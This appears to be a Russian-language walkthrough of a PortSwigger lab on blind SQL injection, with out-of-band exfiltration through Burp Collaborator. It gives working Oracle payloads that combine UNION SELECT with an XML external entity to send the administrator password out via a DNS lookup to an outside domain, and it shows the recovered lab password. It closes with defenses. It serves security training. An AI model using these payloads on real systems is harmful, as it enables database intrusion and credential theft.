# 📘 PortSwigger Lab: Blind SQL Injection with Out-of-Band Data Exfiltration

<a id="top"></a>

> 🔗 Лабораторная работа: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration

---

## 📑 Содержание

- [🎯 Цель](#goal)
- [🧠 Идея атаки](#idea)
- [🧩 Теория: что такое OAST exfiltration](#theory-oast)
- [🧩 Почему используется Burp Collaborator](#collaborator)
- [🔍 Шаг 1 — Находим TrackingId](#step1)
- [🔍 Шаг 2 — Получаем Collaborator payload](#step2)
- [🔍 Шаг 3 — Проверяем OAST-канал](#step3)
- [🔍 Шаг 4 — Встраиваем пароль в поддомен](#step4)
- [🔍 Шаг 5 — Читаем пароль в Collaborator](#step5)
- [🔍 Шаг 6 — Вход под administrator](#step6)
- [🧩 Использованные payloads](#payloads)
- [🔬 Разбор payload по частям](#breakdown)
- [💥 Почему атака сработала](#why)
- [🧠 Как думать как пентестер](#pentester-logic)
- [🛡 Защита](#defense)
- [🛠 Чеклист](#checklist)

---

<a id="goal"></a>

## 🎯 Цель

Получить пароль пользователя `administrator` через Blind SQL Injection с out-of-band exfiltration и выполнить вход в приложение.

В этой лаборатории результат SQL-запроса не отображается в HTTP-ответе. Поэтому пароль нужно вывести через внешний канал — DNS/HTTP interaction в Burp Collaborator.

---

<a id="idea"></a>

## 🧠 Идея атаки

Приложение использует cookie `TrackingId` внутри SQL-запроса. SQL-запрос выполняется асинхронно и не влияет на видимый HTTP response.

Обычные техники здесь неудобны:

```text
Boolean-based → страница не меняется
Error-based   → ошибок не видно
Time-based    → фоновый SQL-запрос не влияет на response
```

Поэтому используем OAST: заставляем базу данных обратиться к Burp Collaborator и передать пароль как часть поддомена.

Пример результата:

```text
u90spdtrpki2bbpb93b7.p9gquw29wve9xjjktpylfy9gsejka81wq.oastify.com
```

Первая часть домена — это пароль.

---

<a id="theory-oast"></a>

## 🧩 Теория: что такое OAST exfiltration

OAST означает **Out-of-Band Application Security Testing**.

Обычный канал:

```text
Браузер → приложение → HTTP-ответ
```

OAST-канал:

```text
Браузер → приложение → база данных → DNS/HTTP-запрос → Burp Collaborator
```

Exfiltration означает, что мы не просто подтверждаем уязвимость, а выводим данные наружу. В этой лабе данные передаются в имени поддомена:

```text
<password>.<collaborator-domain>
```

---

<a id="collaborator"></a>

## 🧩 Почему используется Burp Collaborator

Burp Collaborator выдает уникальный домен и фиксирует обращения к нему:

```text
p9gquw29wve9xjjktpylfy9gsejka81wq.oastify.com
```

Если уязвимый сервер или база данных попытается обратиться к этому домену, Burp покажет interaction:

```text
DNS
HTTP
```

В этой лаборатории важно использовать именно Burp Collaborator, потому что Academy блокирует обращения к произвольным внешним системам.

---

<a id="step1"></a>

## 🔍 Шаг 1 — Находим TrackingId

В Burp Suite открываем запрос к магазину и находим заголовок `Cookie`.

```http
Cookie: TrackingId=<value>; session=<value>
```

Нас интересует `TrackingId`, потому что описание лаборатории говорит, что это значение попадает в SQL-запрос.

Логика:

```text
TrackingId контролируется пользователем
↓
TrackingId используется в SQL
↓
Возможна SQL Injection
```

---

<a id="step2"></a>

## 🔍 Шаг 2 — Получаем Collaborator payload

В Burp Suite Professional открываем Collaborator Client и копируем payload:

```text
Burp → Collaborator client → Copy to clipboard
```

Получаем домен вида:

```text
p9gquw29wve9xjjktpylfy9gsejka81wq.oastify.com
```

Его нужно вставить в SQL/XML payload.

---

<a id="step3"></a>

## 🔍 Шаг 3 — Проверяем OAST-канал

Сначала проверяем сам факт внешнего interaction, без извлечения пароля.

```http
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//p9gquw29wve9xjjktpylfy9gsejka81wq.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```

После отправки запроса переходим в Collaborator и нажимаем `Poll now`.

Если появился DNS/HTTP interaction, значит база обработала payload и попыталась обратиться к Collaborator.

---

<a id="step4"></a>

## 🔍 Шаг 4 — Встраиваем пароль в поддомен

Теперь добавляем SQL-запрос, который получает пароль:

```sql
SELECT password FROM users WHERE username='administrator'
```

И встраиваем его перед Collaborator-доменом:

```text
<password>.p9gquw29wve9xjjktpylfy9gsejka81wq.oastify.com
```

Payload:

```http
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.p9gquw29wve9xjjktpylfy9gsejka81wq.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```

Цепочка:

```text
Oracle выполняет SELECT password
↓
подставляет пароль в URL
↓
XML parser пытается загрузить external entity
↓
происходит DNS lookup
↓
Collaborator фиксирует домен с паролем
```

---

<a id="step5"></a>

## 🔍 Шаг 5 — Читаем пароль в Collaborator

В Collaborator нажимаем `Poll now`.

Получаем DNS lookup:

```text
u90spdtrpki2bbpb93b7.p9gquw29wve9xjjktpylfy9gsejka81wq.oastify.com
```

Разбор:

```text
u90spdtrpki2bbpb93b7 → пароль из базы
p9gquw29wve9xjjktpylfy9gsejka81wq.oastify.com → Collaborator-домен
```

---

<a id="step6"></a>

## 🔍 Шаг 6 — Вход под administrator

Открываем страницу входа `My account` и используем найденные учетные данные.

<details>
<summary>🔑 Показать пароль administrator</summary>

```text
Username: administrator
Password: u90spdtrpki2bbpb93b7
```

</details>

---

<a id="payloads"></a>

## 🧩 Использованные payloads

Проверка OAST-канала:

```http
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//COLLABORATOR-DOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

Извлечение пароля через поддомен:

```http
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.COLLABORATOR-DOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

---

<a id="breakdown"></a>

## 🔬 Разбор payload по частям

`x'` закрывает строку в исходном SQL-запросе. После этого можно добавлять собственный SQL-код.

`UNION SELECT` заставляет Oracle выполнить дополнительный SELECT. Результат не нужно видеть в странице; важно выполнить XML-функцию.

`EXTRACTVALUE(xmltype(...), '/l')` заставляет Oracle разобрать XML и обработать сущность.

`DOCTYPE` объявляет XML-сущность. Конструкция `ENTITY % remote SYSTEM "http://..."` указывает внешний ресурс.

`%remote;` активирует external entity и провоцирует обращение к URL.

`'||(SELECT password FROM users WHERE username='administrator')||'` склеивает пароль из базы с Collaborator-доменом.

`FROM dual` нужен, потому что это Oracle. Таблица `dual` используется для выполнения выражений без реальной таблицы.

`--` комментирует остаток оригинального SQL-запроса.

---

<a id="why"></a>

## 💥 Почему атака сработала

- `TrackingId` вставлялся напрямую в SQL.
- Приложение не использовало parameterized queries.
- Использовалась Oracle Database.
- Oracle XML parser мог обработать external entity.
- Серверу были разрешены исходящие DNS-запросы.
- Burp Collaborator зафиксировал interaction.
- Пароль был помещен в поддомен.

---

<a id="pentester-logic"></a>

## 🧠 Как думать как пентестер

OAST payload выглядит сложным, но он собирается из понятных блоков:

```text
Закрыть строку
↓
Добавить UNION SELECT
↓
Вызвать XML parser
↓
Создать external entity
↓
Вставить Collaborator-домен
↓
Добавить SELECT password
↓
Получить DNS lookup
```

Главная мысль:

```text
Если данные нельзя увидеть в HTTP-ответе,
можно заставить сервер отправить их наружу.
```

---

<a id="defense"></a>

## 🛡 Защита

- Использовать Prepared Statements.
- Использовать Parameterized Queries.
- Не собирать SQL через конкатенацию строк.
- Ограничить исходящие DNS/HTTP-запросы от БД.
- Отключить опасные XML-функции и external entity processing.
- Логировать подозрительные DNS-запросы.
- Ограничить права database user.

---

<a id="checklist"></a>

## 🛠 Чеклист

- [x] Найден параметр `TrackingId`
- [x] Получен Collaborator payload
- [x] Подтвержден OAST-канал
- [x] Пароль встроен в поддомен
- [x] Получен DNS lookup
- [x] Извлечен пароль administrator
- [x] Выполнен вход под administrator

---

# ⬆ Наверх

[Вернуться к содержанию](#top)
